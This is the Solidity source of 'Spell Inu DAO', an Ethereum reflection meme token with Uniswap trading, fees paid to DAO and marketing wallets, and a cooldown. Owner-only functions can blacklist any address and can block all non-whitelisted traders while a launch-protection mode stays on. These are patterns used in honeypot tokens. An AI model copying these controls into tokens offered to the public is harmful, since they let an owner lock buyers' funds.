1 // SPDX-License-Identifier: Unlicensed
2 
3 /*
4    Spell Inu DAO — Community Meme Token to Increase your $SPELL Rewards 🧙
5    Telegram: t.me/spellinu
6    Stealth Launched on Ethereum
7 */
8 
9 pragma solidity ^0.8.7;
10 
11 abstract contract Context {
12     function _msgSender() internal view virtual returns (address) {
13         return msg.sender;
14     }
15 }
16 
17 interface IERC20 {
18     function totalSupply() external view returns (uint256);
19 
20     function balanceOf(address account) external view returns (uint256);
21 
22     function transfer(address recipient, uint256 amount) external returns (bool);
23 
24     function allowance(address owner, address spender) external view returns (uint256);
25 
26     function approve(address spender, uint256 amount) external returns (bool);
27 
28     function transferFrom(
29         address sender,
30         address recipient,
31         uint256 amount
32     ) external returns (bool);
33 
34     event Transfer(address indexed from, address indexed to, uint256 value);
35     event Approval(address indexed owner, address indexed spender, uint256 value);
36 }
37 
38 library SafeMath {
39     function add(uint256 a, uint256 b) internal pure returns (uint256) {
40         uint256 c = a + b;
41         require(c >= a, "SafeMath: addition overflow");
42         return c;
43     }
44 
45     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
46         return sub(a, b, "SafeMath: subtraction overflow");
47     }
48 
49     function sub(
50         uint256 a,
51         uint256 b,
52         string memory errorMessage
53     ) internal pure returns (uint256) {
54         require(b <= a, errorMessage);
55         uint256 c = a - b;
56         return c;
57     }
58 
59     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
60         if (a == 0) {
61             return 0;
62         }
63         uint256 c = a * b;
64         require(c / a == b, "SafeMath: multiplication overflow");
65         return c;
66     }
67 
68     function div(uint256 a, uint256 b) internal pure returns (uint256) {
69         return div(a, b, "SafeMath: division by zero");
70     }
71 
72     function div(
73         uint256 a,
74         uint256 b,
75         string memory errorMessage
76     ) internal pure returns (uint256) {
77         require(b > 0, errorMessage);
78         uint256 c = a / b;
79         return c;
80     }
81 }
82 
83 contract Ownable is Context {
84     address private _owner;
85     address private _previousOwner;
86     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
87 
88     constructor() {
89         address msgSender = _msgSender();
90         _owner = msgSender;
91         emit OwnershipTransferred(address(0), msgSender);
92     }
93 
94     function owner() public view returns (address) {
95         return _owner;
96     }
97 
98     modifier onlyOwner() {
99         require(_owner == _msgSender(), "Ownable: caller is not the owner");
100         _;
101     }
102 
103     function renounceOwnership() public virtual onlyOwner {
104         emit OwnershipTransferred(_owner, address(0));
105         _owner = address(0);
106     }
107 }
108 
109 interface IUniswapV2Factory {
110     function createPair(address tokenA, address tokenB) external returns (address pair);
111 }
112 
113 interface IUniswapV2Router02 {
114     function swapExactTokensForETHSupportingFeeOnTransferTokens(
115         uint256 amountIn,
116         uint256 amountOutMin,
117         address[] calldata path,
118         address to,
119         uint256 deadline
120     ) external;
121 
122     function factory() external pure returns (address);
123 
124     function WETH() external pure returns (address);
125 
126     function addLiquidityETH(
127         address token,
128         uint256 amountTokenDesired,
129         uint256 amountTokenMin,
130         uint256 amountETHMin,
131         address to,
132         uint256 deadline
133     )
134         external
135         payable
136         returns (
137             uint256 amountToken,
138             uint256 amountETH,
139             uint256 liquidity
140         );
141 }
142 
143 contract SpellInuDAO is Context, IERC20, Ownable {
144     using SafeMath for uint256;
145     mapping(address => uint256) private _rOwned;
146     mapping(address => uint256) private _tOwned;
147     mapping(address => mapping(address => uint256)) private _allowances;
148     mapping(address => bool) private _isExcludedFromFee;
149     mapping(address => bool) private bots;
150     mapping(address => uint256) private cooldown;
151     uint256 private constant MAX = ~uint256(0);
152     uint256 private constant _tTotal = 1e12 * 10**9;
153     uint256 private _rTotal = (MAX - (MAX % _tTotal));
154     uint256 private _tFeeTotal;
155 
156     uint256 private _feeAddr1;
157     uint256 private _feeAddr2;
158     address payable private _feeAddrWallet1;
159     address payable private _feeAddrWallet2;
160 
161     string private constant _name = "Spell Inu DAO";
162     string private constant _symbol = "SPELLINU";
163     uint8 private constant _decimals = 9;
164 
165     IUniswapV2Router02 private uniswapV2Router;
166     address public uniswapV2Pair;
167     bool private tradingOpen;
168     bool private inSwap = false;
169     bool private swapEnabled = false;
170     bool private cooldownEnabled = false;
171     uint256 private _maxTxAmount = _tTotal;
172     event MaxTxAmountUpdated(uint256 _maxTxAmount);
173     modifier lockTheSwap() {
174         inSwap = true;
175         _;
176         inSwap = false;
177     }
178     
179     bool public isLaunchProtectionMode = true;
180     mapping(address => bool) public launchProtectionWhitelist;
181 
182     constructor(address daoFund, address marketingAddr) {
183         _feeAddrWallet1 = payable(daoFund);
184         _feeAddrWallet2 = payable(marketingAddr);
185         _rOwned[_msgSender()] = _rTotal;
186         _isExcludedFromFee[owner()] = true;
187         _isExcludedFromFee[address(this)] = true;
188         _isExcludedFromFee[_feeAddrWallet1] = true;
189         _isExcludedFromFee[_feeAddrWallet2] = true;
190         launchProtectionWhitelist[address(this)] = true;
191         launchProtectionWhitelist[msg.sender] = true;
192         emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
193     }
194 
195     function name() public pure returns (string memory) {
196         return _name;
197     }
198 
199     function symbol() public pure returns (string memory) {
200         return _symbol;
201     }
202 
203     function decimals() public pure returns (uint8) {
204         return _decimals;
205     }
206 
207     function totalSupply() public pure override returns (uint256) {
208         return _tTotal;
209     }
210 
211     function balanceOf(address account) public view override returns (uint256) {
212         return tokenFromReflection(_rOwned[account]);
213     }
214 
215     function transfer(address recipient, uint256 amount) public override returns (bool) {
216         _transfer(_msgSender(), recipient, amount);
217         return true;
218     }
219 
220     function allowance(address owner, address spender) public view override returns (uint256) {
221         return _allowances[owner][spender];
222     }
223 
224     function approve(address spender, uint256 amount) public override returns (bool) {
225         _approve(_msgSender(), spender, amount);
226         return true;
227     }
228 
229     function transferFrom(
230         address sender,
231         address recipient,
232         uint256 amount
233     ) public override returns (bool) {
234         _transfer(sender, recipient, amount);
235         _approve(
236             sender,
237             _msgSender(),
238             _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
239         );
240         return true;
241     }
242 
243     function setCooldownEnabled(bool onoff) external onlyOwner {
244         cooldownEnabled = onoff;
245     }
246 
247     function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
248         require(rAmount <= _rTotal, "Amount must be less than total reflections");
249         uint256 currentRate = _getRate();
250         return rAmount.div(currentRate);
251     }
252 
253     function _approve(
254         address owner,
255         address spender,
256         uint256 amount
257     ) private {
258         require(owner != address(0), "ERC20: approve from the zero address");
259         require(spender != address(0), "ERC20: approve to the zero address");
260         _allowances[owner][spender] = amount;
261         emit Approval(owner, spender, amount);
262     }
263 
264     function _transfer(
265         address from,
266         address to,
267         uint256 amount
268     ) private {
269         require(from != address(0), "ERC20: transfer from the zero address");
270         require(to != address(0), "ERC20: transfer to the zero address");
271         require(amount > 0, "Transfer amount must be greater than zero");
272         _feeAddr1 = 2;
273         _feeAddr2 = 8;
274         if (from != owner() && to != owner()) {
275             require(!bots[from] && !bots[to]);
276             if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] && cooldownEnabled) {
277                 // Cooldown
278                 require(amount <= _maxTxAmount);
279                 require(cooldown[to] < block.timestamp);
280                 cooldown[to] = block.timestamp + (300 seconds);
281             }
282             
283             if (isLaunchProtectionMode) {
284             require(launchProtectionWhitelist[tx.origin] == true, "Not whitelisted");
285             }
286 
287             if (to == uniswapV2Pair && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) {
288                 _feeAddr1 = 2;
289                 _feeAddr2 = 8;
290             }
291             
292             uint256 contractTokenBalance = balanceOf(address(this));
293 
294             if (!inSwap && from != uniswapV2Pair && swapEnabled) { // sells
295                 if (contractTokenBalance > 0) {
296                     if (contractTokenBalance > balanceOf(uniswapV2Pair).mul(5).div(100)) {
297                         contractTokenBalance = balanceOf(uniswapV2Pair).mul(5).div(100);
298                     }
299                     swapTokensForEth(contractTokenBalance);
300                 }
301 
302                 uint256 contractETHBalance = address(this).balance;
303                 if (contractETHBalance > 0) {
304                     sendETHToFee(address(this).balance);
305                 }
306             }
307         }
308 
309         _tokenTransfer(from, to, amount);
310     }
311 
312     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
313         address[] memory path = new address[](2);
314         path[0] = address(this);
315         path[1] = uniswapV2Router.WETH();
316         _approve(address(this), address(uniswapV2Router), tokenAmount);
317         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
318             tokenAmount,
319             0,
320             path,
321             address(this),
322             block.timestamp
323         );
324     }
325 
326     function sendETHToFee(uint256 amount) private {
327         _feeAddrWallet1.transfer(amount.div(2));
328         _feeAddrWallet2.transfer(amount.div(2));
329     }
330 
331     function openTrading() external onlyOwner {
332         require(!tradingOpen, "trading is already open");
333         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
334         uniswapV2Router = _uniswapV2Router;
335         _approve(address(this), address(uniswapV2Router), _tTotal);
336         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
337             address(this),
338             _uniswapV2Router.WETH()
339         );
340         launchProtectionWhitelist[uniswapV2Pair] = true;
341         uniswapV2Router.addLiquidityETH{ value: address(this).balance }(
342             address(this),
343             balanceOf(address(this)),
344             0,
345             0,
346             owner(),
347             block.timestamp
348         );
349         swapEnabled = true;
350         cooldownEnabled = true;
351         _maxTxAmount = 0.005 * 10**12 * 10**9; // 0.5% max trade
352         tradingOpen = true;
353         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
354     }
355 
356     function setBots(address[] memory bots_) public onlyOwner {
357         for (uint256 i = 0; i < bots_.length; i++) {
358             bots[bots_[i]] = true;
359         }
360     }
361 
362     function removeStrictTxLimit() public onlyOwner {
363         _maxTxAmount = 1e12 * 10**9;
364     }
365     
366     function changeStrictTxLimit1() public onlyOwner {
367         _maxTxAmount = 0.01 * 1e12 * 10**9;
368     }
369 
370     function delBot(address notbot) public onlyOwner {
371         bots[notbot] = false;
372     }
373 
374     function _tokenTransfer(
375         address sender,
376         address recipient,
377         uint256 amount
378     ) private {
379         _transferStandard(sender, recipient, amount);
380     }
381 
382     function _transferStandard(
383         address sender,
384         address recipient,
385         uint256 tAmount
386     ) private {
387         (
388             uint256 rAmount,
389             uint256 rTransferAmount,
390             uint256 rFee,
391             uint256 tTransferAmount,
392             uint256 tFee,
393             uint256 tTeam
394         ) = _getValues(tAmount);
395         _rOwned[sender] = _rOwned[sender].sub(rAmount);
396         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
397         _takeTeam(tTeam);
398         _reflectFee(rFee, tFee);
399         emit Transfer(sender, recipient, tTransferAmount);
400     }
401 
402     function _takeTeam(uint256 tTeam) private {
403         uint256 currentRate = _getRate();
404         uint256 rTeam = tTeam.mul(currentRate);
405         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
406     }
407 
408     function _reflectFee(uint256 rFee, uint256 tFee) private {
409         _rTotal = _rTotal.sub(rFee);
410         _tFeeTotal = _tFeeTotal.add(tFee);
411     }
412 
413     receive() external payable {}
414 
415     function manualswap() external {
416         require(_msgSender() == _feeAddrWallet1);
417         uint256 contractBalance = balanceOf(address(this));
418         swapTokensForEth(contractBalance);
419     }
420 
421     function manualsend() external {
422         require(_msgSender() == _feeAddrWallet1);
423         uint256 contractETHBalance = address(this).balance;
424         sendETHToFee(contractETHBalance);
425     }
426 
427     function _getValues(uint256 tAmount)
428         private
429         view
430         returns (
431             uint256,
432             uint256,
433             uint256,
434             uint256,
435             uint256,
436             uint256
437         )
438     {
439         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _feeAddr1, _feeAddr2);
440         uint256 currentRate = _getRate();
441         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
442         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
443     }
444 
445     function _getTValues(
446         uint256 tAmount,
447         uint256 taxFee,
448         uint256 TeamFee
449     )
450         private
451         pure
452         returns (
453             uint256,
454             uint256,
455             uint256
456         )
457     {
458         uint256 tFee = tAmount.mul(taxFee).div(100);
459         uint256 tTeam = tAmount.mul(TeamFee).div(100);
460         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
461         return (tTransferAmount, tFee, tTeam);
462     }
463 
464     function _getRValues(
465         uint256 tAmount,
466         uint256 tFee,
467         uint256 tTeam,
468         uint256 currentRate
469     )
470         private
471         pure
472         returns (
473             uint256,
474             uint256,
475             uint256
476         )
477     {
478         uint256 rAmount = tAmount.mul(currentRate);
479         uint256 rFee = tFee.mul(currentRate);
480         uint256 rTeam = tTeam.mul(currentRate);
481         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
482         return (rAmount, rTransferAmount, rFee);
483     }
484 
485     function _getRate() private view returns (uint256) {
486         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
487         return rSupply.div(tSupply);
488     }
489 
490     function _getCurrentSupply() private view returns (uint256, uint256) {
491         uint256 rSupply = _rTotal;
492         uint256 tSupply = _tTotal;
493         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
494         return (rSupply, tSupply);
495     }
496     
497     function setLaunchWhitelist(address account, bool value) external onlyOwner {
498         launchProtectionWhitelist[account] = value;
499     }
500     
501     function setLaunchWhitelistList(address[] memory _whitelist) external onlyOwner {
502         for (uint i = 0; i<_whitelist.length; i++) {
503         launchProtectionWhitelist[_whitelist[i]] = true;}
504     }
505 
506     function newDAOAddr(address newAddr) public {
507         require(msg.sender == _feeAddrWallet1);
508         _feeAddrWallet1 = payable(newAddr);
509         _isExcludedFromFee[_feeAddrWallet1] = true;
510     }
511     
512     function newMarketingAddr(address newAddr) public {
513         require(msg.sender == _feeAddrWallet2);
514         _feeAddrWallet2 = payable(newAddr);
515         _isExcludedFromFee[_feeAddrWallet2] = true;
516     }
517     
518     function endLaunchProtection() external onlyOwner {
519         isLaunchProtectionMode = false;
520     }
521 }